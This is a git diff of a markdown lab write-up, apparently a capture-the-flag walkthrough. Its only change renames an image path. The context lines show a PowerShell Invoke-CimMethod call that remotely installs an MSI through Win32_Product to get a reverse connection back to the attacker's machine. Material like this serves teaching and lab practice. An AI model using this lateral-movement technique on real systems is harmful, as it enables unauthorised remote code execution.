@@ -439,7 +439,7 @@ We then invoke the Install method from the Win32\_Product class to trigger the p
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
 ```
 
-<figure><img src="../../.gitbook/assets/image (13) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 As a result, you should receive a connection in your AttackBox from where you can access a flag on t1\_corine.waters desktop.
 
